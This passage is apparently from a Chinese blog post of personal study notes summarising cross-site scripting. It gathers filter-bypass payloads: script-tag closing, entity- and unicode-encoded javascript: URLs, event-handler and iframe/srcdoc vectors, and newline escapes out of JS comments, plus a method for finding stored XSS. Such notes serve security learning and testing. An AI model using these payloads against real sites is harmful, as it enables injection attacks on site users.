href=&quot;javascript:localhoin=alert(1)&quot;&gt;GO&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">输出在&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;之间的情况(意思就是你在script里面，得把前面的闭合了在注入语句，然后因为你在script里面直接输入语句即可)</span><br><span class="line">    先闭合上一个script然后在注入恶意代码:&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;)</span><br><span class="line">    如果&lt;,&gt;,/等符号被过滤了可以用：eval(alert(1)) #eval()函数用于直接执行代码 参考：http://www.runoob.com/jsref/jsref-eval.html</span><br><span class="line">    </span><br><span class="line">输出在其他标签里面</span><br><span class="line">    注意：html转义后在标签的属性中会其到一定的绕过作用 参考文章：https://www.cnblogs.com/iceli/p/8598709.html</span><br><span class="line">    　当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&apos;xxxx&apos;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&apos;xx&apos;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段。如：</span><br><span class="line">        &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;/a&gt;</span><br><span class="line">    如在&lt;input&gt;里，解决办法：&lt;input type=&quot;text&quot; value=&quot;&quot; onclick=&quot;alert(1)&quot;&gt;</span><br><span class="line">    出现在a标签的href里面，类似于：&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=&lt;你输入的值&gt;&apos;&gt;</span><br><span class="line">    由于在href里面，可以使用javascript。就构造&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=alert(1)&apos;&gt;</span><br><span class="line">    如果单引号等字符被过滤的话，使用：&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=alert&amp;#x28;1&amp;#x29&apos;&gt; //实体化被过滤的符号</span><br><span class="line">    </span><br><span class="line"> 宽字节xss：</span><br><span class="line">    如果页面用了gbk编码的话，可以用对应的编码进行编码被过滤的符号导致可以绕过过滤</span><br><span class="line">    </span><br><span class="line"> 空格被实体化过滤</span><br><span class="line">    注解：javascript的注释符为/**/ , //</span><br><span class="line">    当空格被过滤后，使用注释符来绕过。例子：</span><br><span class="line">    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br><span class="line">    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br><span class="line">    </span><br><span class="line">    学到的js的一个特性：javascript会先解析函数在解析其他</span><br><span class="line">    例子：</span><br><span class="line">    a();</span><br><span class="line">    function as() &#123;&#125; </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    而js执行顺序是：</span><br><span class="line">    function as() &#123;&#125;</span><br><span class="line">    a();</span><br><span class="line">    </span><br><span class="line">当输入的语句出现在注释里 (有机可乘的xss)</span><br><span class="line">    当输入的语句出现在js注释的源码的时候，加一个换行符就能引发xss</span><br><span class="line">    例如：http://xxx.com/jj.php?xxx=aaaaa</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    //function  A() &#123;</span><br><span class="line">    //    var g=getElementById(demo).value;</span><br><span class="line">    //    document.write(g);</span><br><span class="line">    //&#125;</span><br><span class="line">    //document.write(你输入的)</span><br><span class="line">    document.write(&quot;wwww&quot;)</span><br><span class="line">;    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    构造的xss语句：http://xxx.com/jj.php?xxx=%0aalert(1) //) #通过%0a换行符，换到了没有注释的下一行然后闭合掉后面的括号</span><br><span class="line"></span><br><span class="line">使用反斜杆构造xss</span><br><span class="line">    当输入的语句处于多行js代码之中，使用\分开，例子：</span><br><span class="line">    &lt;script&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regalias=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb\%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;+&quot;&amp;ss=aaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt;</span><br><span class="line">    使用\分割语句然后想办法闭合</span><br><span class="line">    </span><br><span class="line"> ：反弹xss一般出现在url拦</span><br><span class="line"></span><br><span class="line">DOM型xss</span><br><span class="line">DOM型的xss就是通过输入，改变了js代码的一部分。dom型xss又分两种：</span><br><span class="line">1.可见型DOM xss，输入的东西改变了页面的源码。但是F12查看源码可见</span><br><span class="line">类似于：</span><br><span class="line">&lt;strong id=&quot;titleshow&quot;&gt;按职业1检索：aaaaaaa &lt;/strong&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(&quot;aaaaaaa&quot;==&quot;&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按地区检索：全部明星&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业1&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业2&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业3&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">aaaaa为我们输入的，假设现在&lt;,&gt;被过滤了。但是\没被过滤，该如何构造xss呢</span><br><span class="line">由于\没有被过滤，使用unicode编码&lt;和&gt;，变为</span><br><span class="line">被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</span><br><span class="line"></span><br><span class="line">当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。如：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br><span class="line"> unicode编码在标签的属性之中可用，如果在输出使用不会影响上下文</span><br><span class="line"> </span><br><span class="line"> 参考文章：https://www.cnblogs.com/iceli/p/8598709.html</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">2.不可见型DOM xss</span><br><span class="line">    类似于DVWA里的DOM型xss，只能用调试工具定位。审核源代码是看不见的</span><br><span class="line">    记录一些DOM型xss常用的语句：</span><br><span class="line">    在iframe中执行js:&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">                               &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">                               &lt;iframe src=&quot;vbscript:msbox(1)&quot;&gt;&lt;/iframe&gt; IE执行VBScript代码</span><br><span class="line">                               &lt;iframe src=&quot;data:text/html&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; chrome执行data协议代码</span><br><span class="line">                               &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; 上面的变体</span><br><span class="line">                               &lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; chrome下的srcdoc属性</span><br><span class="line"> 总结：在探测一个地方是否有xss的时候，插入好搜索的语句例如：aaaaaa。然后f12源码搜索，分析出现的地方，看看哪里能实现xss。如果有被过滤</span><br><span class="line"> 了，先试试html转义，注意闭合。当\符号没被过滤的时候可以使用unicode编码来进行代替被过滤的函数或符号 （前提是在script标签里）</span><br><span class="line"> </span><br><span class="line">  存储型xss：</span><br><span class="line">        一定要记住本节最开头的话，存储型XSS，输出的位置不一定出现在输入的位置。</span><br><span class="line">        7. 因而我们有时候需要逆向的思维，来寻找存储型XSS。 大概思路如下：</span><br><span class="line">        7.1 先找到输出点，然后猜测此处输出是否会被过滤。</span><br><span class="line">        7.2 如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。</span><br><span class="line">        7.3 接着开始测试输入，看输出的效果。</span><br><span class="line">        7.4 如果没过滤，那么你就成功了，否则你可以放弃掉它。</span><br><span class="line"></span><br><span class="line">xss 存储型payload：http://html5sec.org/</span><br></pre></td></tr></table></figure></p>
+<p>转载请声明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5104189a.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5104189a.html&text=xss summary"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5104189a.html&is_video=false&description=xss summary"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xss summary&body=Check out this article: http://422926799.github.io/posts/5104189a.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5104189a.html&name=xss summary&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
